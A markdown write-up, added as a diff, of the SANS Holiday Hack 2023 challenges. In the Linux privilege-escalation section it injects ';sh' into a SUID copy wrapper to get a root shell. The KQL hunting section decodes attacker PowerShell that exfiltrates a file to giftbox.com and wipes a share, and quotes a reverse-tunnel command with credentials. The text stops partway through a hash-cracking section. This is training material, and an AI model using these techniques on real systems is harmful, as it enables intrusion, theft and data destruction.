@@ -1,0 +1,2442 @@
+# SANS Holiday Hack 2023
+
+## Holiday Hack Orientation
+
+Sail to christmas island (orientation) and talk to Jingle Radford. He will ask some questions to check whether the terminal is working in your browser. Complete his tests to make sure the cranberry pi is working, and listen to what he has to say. After that go on your way!
+
+## Snowball Fight
+
+Now sail to Frostys Beach. Talk to the Goose of Christmas island first to get your lei on your ship, and then talk to Santa. Santa will suggest that you start off your vacation with a snowball fight. Head over to the pi terminal to check it out.
+
+Once inside the game, team up with your fellow player to rid the map of enough elves to be able to focus on santa (you can only hit elves whose color matches your snowball). The strategy I used was to both rapid fire at santa as much as possible to take down his health. Both players must be doing this at the same time to wear down his HP. Repeat this until victory.
+
+![Victory!](images/snowball_fight//victory.png)
+
+## Linux 101
+
+### Background
+
+Talking to Ginger Breddie, he (she?) asks us to join them in some Linux challenges. Here is each challenge along with its answer.
+
+### 1 - Find troll in home directory
+
+`ls`
+
+### 2 - Now find the troll inside the troll
+
+`cat troll_19315479765589239`
+
+You can just type `cat troll` and then press tab to autocomplete the filename.
+
+### 3 - Great, now remove the troll in your home directory
+
+`rm troll_19315479765589239`
+
+### 4- Print the present working directory using a command
+
+`pwd`
+
+### 5 - Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!
+
+`ls -la`
+
+### 6 - Excellent, now find the troll in your command history
+
+`history`
+
+### 7 - Find the troll in your environment variables
+
+`printenv`
+
+### 8 - Next, head into the workshop
+
+`cd workshop`
+
+### 9 - A troll is hiding in one of the workshop toolboxes. Use "grep" while ignoring case to find which toolbox the troll is in
+
+`grep -iR "troll"`
+
+The `i` flag tells grep to ignore case, and the `R` flag tells grep to recursively search.
+
+This command gives the file `./toolbox_191.txt:tRoLl.4056180441832623`.
+
+### 10 - A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll
+
+First lets find the `present_engine` binary.
+
+`find present_engine /`
+
+The results show this: `/opt/present_engine`. We get permission denied if we try to run the binary in this directory, so copy it to our home directory and change the permissions to 755, and then run the binary.
+
+```
+cp /opt/present_engine ~/
+chmod 755 ~/present_engine
+~/present_engine
+```
+
+We get the following output `troll.898906189498077`.
+
+### 11 - Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0
+
+```
+cd ~/workshop/electrical
+mv blown_fuse0 fuse0
+```
+
+### 12 - Now, make a symbolic link (symlink) named fuse1 that points to fuse0
+
+```
+ln -s fuse0 fuse1
+```
+
+### 13 - Make a copy of fuse1 named fuse2
+
+```
+cp fuse1 fuse2
+```
+
+### 14 - We need to make sure trolls don't come back. Add the characters "TROLL_REPELLENT" into the file fuse2
+
+```
+vim /home/elf/workshop/electrical/fuse2
+```
+
+Press the `i` key to change to insert mode, write the text `TROLL_REPELLENT`, press the escape key then write `:wq` and press enter to save and quit.
+
+### 15 - Find the troll somewhere in /opt/troll_den
+
+```
+find "troll" /opt/troll_den
+```
+
+### 16 - Find the file somewhere in /opt/troll_den that is owned by the user troll
+
+```
+find /opt/troll_den/ -user troll
+```
+
+Output: `/opt/troll_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/tr0LL_9528909612014411`
+
+### 17 - Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den
+
+```
+find /opt/troll_den/ -size +$((108*1024))c -size -$((110*1024))c
+```
+
+Output: `/opt/troll_den/plugins/portlet-mocks/src/test/java/org/apache/t_r_o_l_l_2579728047101724`
+
+### 18 - List running processes to find another troll
+
+```
+ps -a
+```
+
+Output: `4552 pts/2    00:00:00 14516_troll`
+
+### 19 - The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen
+
+```
+netstat -tunlp
+```
+
+Output:
+
+```
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN      4552/python3
+```
+
+### 20 - The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll
+
+```
+curl 127.0.0.1:54321
+```
+
+Output: `troll.73180338045875`
+
+### 21 - Your final task is to stop the 14516_troll process to collect the remaining presents
+
+```
+kill -9 4552
+```
+
+Done!
+
+## Reportinator
+
+### Background
+
+The objective here is to read over a pentest report which was generated by ChatNPT. There are supposedly some "hallucinations" in the report which we must catch and report to Noel Boetie.
+
+This report can be done two different ways. The first is by locating the incorrect information by reading the report. The second is by brute forcing all the possible combinations of answers to the web server that this challenge is hosted on.
+
+### Method 1: Reading the Report
+
+#### Section 3 - Remote Code Execution via Java Deserialization of Stored Database Objects
+
+This section mentions that a malicious actor could intercept HTTP request traffic on port 88555/TCP. HTTP traffic does not go to port 88555, it goes to port 80, or 443 for HTTPS. This is our first "hallucination".
+
+#### Section 6 - Stored Cross-Site Scripting Vulnerabilities
+
+This section mentions that they used "Burp Suite\* to manipulate HTTP SEND". "HTTP SEND" is specific to the burp application, so this is slightly misleading and not true. What they should have said is that they used Burp Suite to manipulate the HTTP traffic. This is our second "hallucination".
+
+#### Section 9 - Internal IP Address Disclosure
+
+In this section, they mention an "HTTP 7.4.33 request". HTTP only has major versions up to 3, not 7. It seems as though ChatNPT was confused and inserted the PHP version number (7.4.33) from an earlier finding into this paragraph as the HTTP version. This is our third "hallucination".
+
+Those are all the issues.
+
+### Method 2: Brute Force
+
+By writing our own script or using Burp, we can brute force all the combinations of answers to the webserver until we get a 200 response code. At that point we can check the url parameters to see the correct answer.
+
+Looking at burps HTTP proxy history after trying a couple times to submit an answer, you can see the following pattern. To submit the answers to the server, the browser makes a request to the server url with the answers in the url parameters like so; `myurl.com?input-1=0&input-2=1&input-3=0&input-4...etc` all the way up to `input-9`. The values must be either 0 or 1. Knowing this, we can set up a burp intruder cluster bomb attack to enumerate every possible combination and send the request to the server. If unfamiliar with Burp or the cluster bomb attack, take a look [here](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types).
+
+Once we run the attack, we wait for a bit until we see a 200 HTTP status code. That indicates our submission was correct.
+
+![cluster bomb results](images/reportinator/results.png)
+
+And look at that, above we see the request that returned a 200 status code. It has the url parameter value set to 1 for parameters input-3, input-6, and input-9. Same answer as the first method.
+
+Wrong answers: 3, 6, 9.
+
+## Azure 101
+
+### Background
+
+Sparkle Redberry has asked us to help them with the azure CLI since Alabaster Snowball has started using it and needs all the elves to learn it as well. Below is each task and the solution for completing it.
+
+### 1 - You may not know this but the Azure cli help messages are very easy to access. First, try typing 'az help | less'
+
+```
+az help | less
+```
+
+### 2 - Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )
+
+```
+az account show | less
+```
+
+That command gives us the following output:
+
+```
+{
+  "environmentName": "AzureCloud",
+  "id": "2b0942f3-9bca-484b-a508-abdae2db5e64",
+  "isDefault": true,
+  "name": "northpole-sub",
+  "state": "Enabled",
+  "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
+  "user": {
+    "name": "northpole@northpole.invalid",
+    "type": "user"
+  }
+}
+```
+
+### 3 - Excellent! Now get a list of resource groups in Azure
+
+We were also given this link as a reference:
+
+https://learn.microsoft.com/en-us/cli/azure/group?view=azure-cli-latest
+
+```
+az group list | less
+```
+
+That command gives us the following output:
+
+```
+[
+  {
+    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
+    "location": "eastus",
+    "managedBy": null,
+    "name": "northpole-rg1",
+    "properties": {      "provisioningState": "Succeeded"
+    },
+    "tags": {}  },
+  {
+    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2",
+    "location": "westus",
+    "managedBy": null,    "name": "northpole-rg2",
+    "properties": {
+      "provisioningState": "Succeeded"
+    },
+    "tags": {}
+  }
+]
+```
+
+### 4- Ok, now use one of the resource groups to get a list of function apps
+
+We are given the following link as a resource:
+
+https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest
+
+```
+az functionapp list --resource-group northpole-rg1
+```
+
+Output is too long to show.
+
+### 5 - Find a way to list the only VM in one of the resource groups you have access to
+
+```
+az vm list --resource-group northpole-rg2
+```
+
+That command gives us an output showing one VM named `NP-VM1`.
+
+### 6 - Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM
+
+The following command runs the `ls` command to list a file on the `NP-VM1` VM which is in the resource group `northpole-rg2`.
+
+```
+az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts "ls"
+```
+
+Done!
+
+## Luggage Lock
+
+### Background
+
+Garland Candlesticks left an important pamphlet in his luggage, but he can't remember the combination for his luggage lock. He needs our help to open it.
+
+### Solution
+
+Chris Elgee did a talk on this explaining how to exploit these types of locks. Find it [here](https://www.youtube.com/watch?v=ycM1hBSEyog).
+
+Following Chris Elgee's talk; rotate wheel closest to open button and slowly increase tention until you get resistance. Once you get some resistance, go to next wheel and continue, increase tension, etc. At the end try to open (by clicking the lock in all the way). If the lock doesnt open, readjust some of the wheels and try again. It seems this challenge does not have a hard coded answer. Some of the different solutions I had were as follows: `8272, 0616`.
+
+## Linux PrivEsc
+
+### Objective
+
+Rose Mold needs our help to escalate privileges on a linux shell.
+
+`Find a method to escalate privileges inside this terminal and then run the binary in /root *`
+
+### Hint #1:
+
+Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.
+
+### Hint #2:
+
+There's various ways to escalate privileges on a Linux system. https://payatu.com/blog/a-guide-to-linux-privilege-escalation/
+
+### Solution
+
+Looking through the link in hint #2, we see a few different options. One section talks about exploiting SUID executables. SUID stands for set user ID. What this basically means is an executable that is set to always run with a specific user ID. So even if you are user `elf` and you run the executable, if the executable has a set user ID of say `root` then it will be run as root. As you can imagine this can lead to some problems if the wrong binary has this set.
+
+The article gives a command to find any SUID binaries on your system.
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Lets try it out.
+
+This is what we get as output:
+
+```
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/simplecopy
+```
+
+All of these are seemingly normal, except for `simplecopy`. Lets take a look and see what simplecopy does.
+
+```
+$ simplecopy
+Usage: simplecopy <source> <destination>
+```
+
+This seems pretty straightforward. We can copy files just as expected. Lets see what happens if we try and copy something that doesn't exist.
+
+```
+$ simplecopy /help .
+cp: cannot stat '/help': No such file or directory
+```
+
+This is interesting. So it seems as though simplecopy is just a wrapper around the cp binary. All it does is pass these arguments to cp for it to run them. So this means if we can find a way to tack on another command to the arguments we give simplecopy, it will just pass that to cp and run the whole thing as root. The trick is to do it in a way that won't trigger an error for simplecopy and quit before the command is run.
+
+One thing we can try is to set the second argument of simplecopy to a command we want root to run like "sh". We dont want to just write `"simplecopy HELP sh"` since that will just create a file called sh. We want it to run the `sh` command independently. One way to do this in linux is to put a semicolon in between commands. This will allow you to write multiple commands on the same line. For example, the command `echo test;echo test2` would print both "test" and "test2" to the console. Using that same thought process, lets try the following:
+
+```
+simplecopy HELP ;sh
+```
+
+This command gives simplecopy its required 2 arguments, but sneakily also adds in the semicolon to try and trick it into passing it along to cp so the whole thing can be run. Unfortunately, we get the following error and a shell is opened for our user `elf`.
+
+```
+Usage: simplecopy <source> <destination>
+```
+
+So it seems as though the semicolon is ending the command for simplecopy which is why cp is throwing an error. It is only being given the one argument, and then sh is being run as `elf`, opening another shell for that user. To fix this, we need to find a way to trick simplecopy into thinking that `;sh` is all one argument. We can do this by using quotes.
+
+```
+$ simplecopy HELP ";sh"
+cp: missing destination file operand after 'HELP'
+Try 'cp --help' for more information.
+#
+# whoami
+root
+#
+```
+
+And would you look at that! Using quotes got our crafty argument passed through to cp and the command was run. We are now root and can go run the binary.
+
+```
+# cd /root
+# ls
+runmetoanswer
+# ./runmetoanswer
+Who delivers Christmas presents?
+
+> santa
+Your answer: santa
+
+Checking....
+Your answer is correct!
+```
+
+Done!
+
+## Faster Lock Combination
+
+### Objective
+
+Bow Ninecandle needs to get into the lavatory but there is a combination lock on the door. He needs our help to get in.
+
+### Resources
+
+We are given a link to a video by HelpfulLockPicker showing how to defeat these types of locks.
+
+https://www.youtube.com/watch?v=27rE5ZvWLU0
+
+This video explains everything you need to know. Below I follow these steps to unlock the lock on the lavatory.
+
+### Find Sticky Number
+
+First reset the lock, give some tension and rotate dial. Find number that it sticks on every time.
+
+`14`
+
+### Finding Guess Numbers
+
+Start at 0 and pull full tension. We are now looking to see that the limits of the dial with full tension are on either side of a whole number. For example, right away we see that at full tension on 0, the left limit of the dial is 39.5 and the right limit is 0.5. This is what we want to see, and our guess number is right in between that at 0. Now we will continue to do this all the way from 0-11. To move on, release just enough tension on the lock to go past the upper barrier and then re-apply full tension to the shackle. The guess number must always be a whole number so if you have dial limits of say 8 and 9, the guess number would be 8.5 which is invalid because its a fraction. You can skip these and continue on.
+
+Numbers found:
+39.5-0.5 --> 0
+8.5-9.5 --> 9
+
+### The Math
+
+### Part A (Finding the First Digit)
+
+First digit = sticky number + 5 = 14 + 5
+=19
+
+### Part B (Finding the Third Digit)
+
+19 / 4 = 4 with remainder of 3
+
+Guess numbers 0 & 9
+0 10 20 30
+9 19 29 39
+
+Divide each of these numbers by 4, and note those with the same remainder as above (3).
+19/4 = 4 with remainder of 3
+39/4 = 9 with remainder of 3
+
+Now put tension on each of these numbers (19, 39) and move the dial. The one which is more loose is the right one.
+In my case here, both of them seem to have the same travel distance but 39 seems to move a bit faster which might mean its more loose.
+
+=39
+
+### Part C (Finding the Second Digit)
+
+Now create a table of 2 rows. The first row starts with the number being the remainder from earlier + 2. The second row starts with the number being the remainder from earlier + 2 + 4. Each of these rows should be continued by adding 8 each time for 4 more columns.
+
+Our remainder from earlier = 3
+
+5 13 21 29 37
+9 17 25 33 1
+
+From the talk, we know that we can eliminate any of these numbers which are within 2 from 0. In our case only 1 is within 2 from 0, so we can eliminate that.
+
+5 13 21 29 37
+9 17 25 33 ~~1~~
+
+The last step is trying out these combos to find the right one.
+
+19-5-39 x
+19-9-39 x
+19-13-39 x
+19-17-39 x
+19-21-39 x
+19-25-39 x
+19-29-39 x
+19-33-39 x
+19-37-39 $$$$$$$
+
+My final combination ended up being `19-37-39`
+
+## Game Cartridges Vol.1
+
+### Objective
+
+Find the first Gamegosling cartridge and beat the game.
+
+### Solution
+
+You can find this cartridge under the sun hat on "The Island of Misfit Toys: Tarnished Trove".
+
+![cartridge location](images/game_cartridges/vol1/cartridge_location.png)
+
+Once loading into the game, we walk southwest and find a dog sitting next to the doorway we came through. He tells us he needs our help to fix the QR code below. Apparently some of the blocks of the QR code are out of place. To get them back in their correct positions, we can sing to the blocks by pressing B while facing them. If our singing hits a block that is out of place, it will light up and also show the correct square where it should be. These blocks can then be pushed to their correct location.
+
+![singing](images/game_cartridges/vol1/sing.png)
+
+Play and move the quares around by singing to see where they go.
+
+The first block is right on the north edge of the QR code, and its correct position is right beside it. This is shown in the image above. The second block is just slightly southwest from this position and its correct position is in the northeast section of the QR code. The other five blocks are all in the southeast side of the QR code, as well as their correct positions. If you want to restart the challenge at any time, you can talk to the dog at the entrance.
+
+After putting each block in its correct position, the following QR code is shown.
+
+![QR code](images/game_cartridges/vol1/qr.png)
+
+Scanning the QR code with a smartphone will show the following URL: https://8bitelf.com/
+
+The flag is shown there:
+`flag:santaconfusedgivingplanetsqrcode`
+
+## Game Cartridges Vol.2
+
+### Objective
+
+Find the second Gamegosling cartridge and beat the game.
+
+### Hints
+
+1. This feels the same, but different!
+2. If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding.
+3. I think I may need to get a DIFFerent perspective.
+4. I wonder if someone can give me a few pointers to swap.
+
+### Solution
+
+This cartridge can be found in Driftbit Grotto on Pixel Island. It is just to the left of Tinsel Upatree.
+
+Upon loading into the game, we go into a field and there is a guard standing at a path between us and the other side of the field. If you try to go past him, he will stop you and not let you past. Upon trying this a few different times, I reloaded the game to see that the side of the field I was on had been switched. The position of the guard had also been switched to be on my side of the field, and upon trying to go past him he again stopped me. This is interesting. It seems like there are 2 different states the game can be in.
+
+Wanting to learn more, I took a look at the source code for the iframe. In there I found this piece of javascript.
+
+```
+// Load a ROM.
+(async function go() {
+  let ranNum = Math.round(Math.random()).toString()
+  let filename = ROM_FILENAME + ranNum + ".gb";
+  console.log(filename);
+  let response = await fetch(filename);
+  let romBuffer = await response.arrayBuffer();
+  const extRam = new Uint8Array(JSON.parse(localStorage.getItem("extram")));
+  Emulator.start(await binjgbPromise, romBuffer, extRam);
+  emulator.setBuiltinPalette(vm.palIdx);
+})();
+```
+
+This seems to build a filename for which the rom is in and then print to the screen that filename. This suggests multiple different roms are being used in this game. Looking in the developer tools console in the browser and reloading the game frame a couple times, we can see the rom filename being printed to the screen. There are two variations that you can see:
+
+- rom/game0.gb
+- rom/game1.gb
+
+When you see this in the console, you can change the filepath of the URL to download both of these files.
+
+- https://gamegosling.com/vol2-akHB27gg6pN0/rom/game0.gb
+- https://gamegosling.com/vol2-akHB27gg6pN0/rom/game0.gb
+
+Next, we want to see the differences between these two roms. We can use `vbindiff` for that (thanks jfolkins). We will try to change diffs between the two ROMs and see what happens (tip: make backups of the originals).
+
+After experimenting changing a few diffs in vbindiff, we get the following results:
+
+- 3rd diff at `0001 6A80` in the 5th column changes the guards position (0B for top, 03 for bottom) This does help us get through though.
+- 4th diff (0001 6AB0, column 9), didnt seem to do much.
+- 0001 7C80, column 1 (02 or 01). This removes the barrier (must stop you from going one way or the other?). Yep. This doesn't fix the guard stopping you when trying to cross, but it changes the direction the guard sends you in once he stops you. So changing the value of this for game0.gb from 02 to 01 will cause the guard to send us up when we try to cross instead of back down where we came from.
+
+![vbindiff](images/game_cartridges/vol2/diff.png)
+
+After changing the value at `0001 7C80` from 02 to 01 in game0.gb we now get sent up past the guard when we try to go past him.
+
+![otherside](images/game_cartridges/vol2/otherside.png)
+
+Now after passing the guard, I go up to some sort of fireball and click A. I enter a house. Now there is a radio that plays morse code. (//. ./.. ///// ./. /.//). This decodes to (G L 0 R Y). I think this is the flag...
+
+![room](images/game_cartridges/vol2/house.png)
+
+`__. ._.. _____ ._. _.__`
+
+`G L 0 R Y`
+
+Done!
+
+## Game Cartridges Vol.3
+
+### Hints
+
+1. This one is a bit long, it never hurts to save your progress!
+2. 8bit systems have much smaller registers than you’re used to.
+3. Isn’t this great?!? The coins are OVERFLOWing in their abundance.
+
+### Solution
+
+This game cartridge can be found in Rusty Quay on Steampunk Island. You must find your way around the maze to get to the cartridge. A little trick for this is to zoom out in your browser so you can see more of the maze at once.
+
+![maze](images/game_cartridges/vol3/maze.png)
+
+After finding the cartridge, we can load it up and play around. Looking at the source code in the devtools, I see the following line:
+
+```
+const ROM_FILENAME = "rom/game.gb";
+```
+
+This shows that this game has only one ROM and its a static filename. We can download the ROM from the following url:
+
+`https://gamegosling.com/vol3-7bNwQKGBFNGQT1/rom/game.gb`
+
+Playing around with the game I figured out a couple things. First level is the only one with no enemies. There are 3 coins, valued at 1, 10, 100 which appear in order as you walk to the right. The next level has enemies and all coins are valued at 1. Next level is the same but with coins valued at 10. Next level is the same but all coins are valued at 100. The level after this has 2 enemies and a couple coins and a guy named jared... who says that people always say its the 5 nines, but really its the 3 nines. This is a reference to 999 coins as the target in this game. Once you get to 999 coins it says "unable to set 0xFE".
+
+![overflow](images/game_cartridges/vol3/overflow.png)
+
+This seems to be a hint for us to check the memory and try some things. Using the Sameboy emulator, we can view and edit memory. Lets try it out.
+
+The first thing we need to figure out is what do we want to change? Well upon getting to the last level in this game, there is a giant gap that cannot be jumped across. Maybe by editing memory we can make the gap smaller or teleport ourselves across. Let's take a look.
+
+After fiddling with the game memory for a while and looking to see what was changing when I moved around, etc, I found the following:
+
+- Memory location 0xc531 seems to be the floor level of the game. If I change it from 56 to 60, our character drops down a little and then stops. If we now try and run across the gap, we dont fall anymore and it seems as though theres an invisible floor for us to walk on.
+
+![memedit](images/game_cartridges/vol3/memedit.png)
+
+After crossing, and entering a room, we talk to man (Tom Liston) who tells us to say the passphrase "morethanmeetstheeye" to ChatNPT and show it our coins. After talking to ChatNPT, it accepts our passphrase and coins (coin number doesnt seem to matter) and then sets the rock in the room to be moveable. Now if we go over to the rock and press A on it, the rock slides to the other side of the room. Then a cutscene plays and our flag is displayed!
+
+![flag](images/game_cartridges/vol3/flag.png)
+
+Flag: `!tom+elf!`
+
+## Na'an
+
+Card game, can only tie pretty much as he uses the same hand every time. We cant input any number outside 0-9 and alphabetical characters dont work either. He mentioned the game is made with Python, and the hint says to use NaN. So thats what we will try.
+
+Using the hand NaN, 1, 2, 8, 9 seems to win each time. Do this until you win the game.
+
+Done!
+
+## KQL Kraken Hunter
+
+First steps to get started (follow instructions as given in the challenge):
+
+1. Create microsoft account.
+2. Run given query to load data into database.
+3. Run next query to sample Employees table.
+
+```s
+Employees
+| take 10
+```
+
+### Onboarding
+
+```
+Employees
+| where role == "Craftsperson Elf"
+| where hostname includes "LAPTOP"
+```
+
+Answer: `25`
+
+### Case 1
+
+```
+Email
+| where link == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
+```
+
+Recipient: `alabaster_snowball@santaworkshopgeeseislands.org`
+
+Sender: `cwombley@gmail.com`
+
+Subject: `[EXTERNAL] Invoice foir reindeer food past due`
+
+### Case 2
+
+```
+Employees
+| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
+```
+
+Role Name: `Head Elf`
+
+Hostname: `Y1US-DESKTOP`
+
+IP: `10.10.0.4`
+
+### Case 3
+
+```
+OutboundNetworkEvents
+| where url == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
+```
+
+What time did Alabaster click on link?: `2023-12-02T10:12:42Z`
+
+```
+FileCreationEvents
+| where hostname == "Y1US-DESKTOP"
+```
+
+Look at the downloaded file MonthlyInvoiceForReindeerFood.docx and look what file downloaded right after.
+
+What file is dropped to Alabasters machine shortly after he downloads the malicious file?: `giftwrap.exe`
+
+### Case 4
+
+```
+ProcessEvents
+| where hostname == "Y1US-DESKTOP"
+```
+
+We look at events on Dec 02 after the time he downloaded the file. We see a suspicious entry:
+`"ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof`
+Reverse tunnel connection forwarded to: 113.37.9.17
+
+Find when attackers enumerated network shares on the machine:
+
+Looking a bit further in the ProcessEvents, we see the following command run:
+`net share`.
+This lists network shares.
+Command was run at: 2023-12-02T16:51:44Z
+
+What hostname did the attacker move laterally to?:
+`cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123`
+
+Answer: `NorthPolefileshare`
+
+### Case 5
+
+Look for encoded messages:
+
+Found these three:
+
+1.
+
+```powershell
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
+```
+
+This command was executed at: 2023-12-24T16:07:47Z
+
+2.
+
+```powershell
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=
+```
+
+3.
+
+```powershell
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=
+```
+
+The arguments they each have seem to be base64. So we can use the base64 command to decode these (echo x | base64 -d)
+Here is the result:
+
+1.  `( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''`
+    This seems to be reversed. Lets reverse it back and see what it says:
+    `powershell.exe -c Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt`
+
+The attacker copied the file `NaughtyNiceList.txt`
+
+2.  `[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*MDr*').NamE[3,11,2]-joiN`
+
+This looks like a bunch of ascii values. We can use javascript (or any programming language) to decode it.
+
+```js
+const codes = [
+  100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120,
+  101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107,
+  116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105,
+  115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120,
+  46, 99, 111, 109, 92, 102, 105, 108, 101,
+];
+let result = "";
+codes.forEach((code) => {
+  result += String.fromCharCode(code);
+});
+console.log(result);
+```
+
+Result: `downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file`
+
+Domain the data was exfiled to: `giftbox.com`
+
+3.  `C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$`
+
+### Case 6
+
+Tha attackers ran the following command from above:
+`C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$`
+
+Executable name: `downwithsanta.exe`
+
+Flag used: `--wipeall`
+
+### Congratulations
+
+We are given this final message as our key to complete the challenge:
+`print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')`
+We can decode this base64 on the command line but its easier if you just paste it into KQL to be run:
+
+Answer: `Beware the Cube that Wombles`
+
+Done!
+
+## Phishing Detection Agency
+
+This challenge is relatively easy. Follow the
+
+Here are a list of the emails that need to have their classification changed:
+
+1. laura.moore - `SAFE` - Everything seems correct.
+2. quentin.adams - `SAFE` - Everything seems correct.
+3. xavier.jones - `UNSAFE` - Headers fail, etc.
+4. john.doe - `SAFE` - Seems to pass everything, but was as `UNSAFE` for some reason.
+5. rachel.brown - `UNSAFE` - DKIM missing.
+6. ursula.morris - `UNSAFE` - DMARC failed and domain is wrong.
+7. michael.roberts - `UNSAFE` - Domain is wrong.
+8. alice.smith - `SAFE` - Everything seems correct.
+9. frank.harrison - `SAFE` - Everything seems correct.
+10. xavier.edwards - `SAFE` - Everything seems correct.
+11. oliver.thomas - `UNSAFE` - Domain is wrong.
+12. uma.foster - `SAFE` - Everything seems correct.
+13. teresa.green - `SAFE` - Everything seems correct.
+
+Done!
+
+## Hashcat
+
+### Background
+
+Talking to Eve Snowshoes, he lets us know that Alabaster Snowball has forgotten his password. He wants our help to recover his password.
+
+Note in terminal: `-w 1 -u 1 --kernel-accel 1 --kernel-loops 1, just in case`
+
+### Objective
+
+Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .\*
+
+### Solution
+
+Looking at `hash.txt` we see the following hash:
+
+```
+$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966
+```
+
+Taking the first part of the hash "$krb5asrep" and looking in https://hashcat.net/wiki/doku.php?id=example_hashes we can see that there is only one match: Kerberos 5, etype 23, AS-REP.
+
+Now lets see if we can use hashcat to crack it.
+
